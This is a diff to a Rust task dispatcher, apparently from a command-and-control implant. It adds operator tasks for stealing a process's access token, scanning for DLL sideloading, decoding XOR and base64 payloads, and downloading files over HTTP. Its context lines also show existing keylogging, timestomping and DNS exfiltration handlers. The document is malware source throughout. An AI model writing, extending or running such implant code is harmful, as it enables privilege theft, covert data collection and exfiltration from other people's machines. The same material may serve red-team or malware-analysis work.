@@ -1078,6 +1078,13 @@ fn dispatch_tasks(
                     };
                     result = Some(SensitiveData::new(msg));
                 }
+                "steal_token" => {
+                    let pid = task.payload.parse::<u32>().unwrap_or(0);
+                    result = Some(crate::modules::token::Token.steal_token(pid));
+                }
+                "revert_token" => {
+                    result = Some(crate::modules::token::Token.revert_to_self());
+                }
                 "timestomp" => {
                     let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
                     if parts.len() == 2 {
@@ -1150,6 +1157,9 @@ fn dispatch_tasks(
                     };
                     result = Some(SensitiveData::new(msg));
                 }
+                "sideload_scan" => {
+                    result = Some(crate::modules::sideload::SideLoad.scan());
+                }
                 "keylogger" => {
                     result = crate::modules::collection::Collection.keylogger_poll();
                 }
@@ -1167,6 +1177,20 @@ fn dispatch_tasks(
                     let data = hex_decode(&task.payload);
                     let compressed = crate::modules::compression::Compression.compress(&data);
                     result = Some(SensitiveData::new(&compressed));
+                }
+                "decode_xor" => {
+                    let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
+                    if parts.len() == 2 {
+                        let data = hex_decode(parts[0]);
+                        let key = parts[1].parse::<u8>().unwrap_or(0);
+                        result = Some(crate::modules::transform::Transform.decode_xor(&data, key));
+                    }
+                }
+                "decode_base64" => {
+                    result = Some(crate::modules::transform::Transform.decode_base64(task.payload.as_bytes()));
+                }
+                "download" => {
+                    result = Some(crate::modules::ingress::Ingress.download_http(&task.payload));
                 }
                 "exfil_dns" => {
                     let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
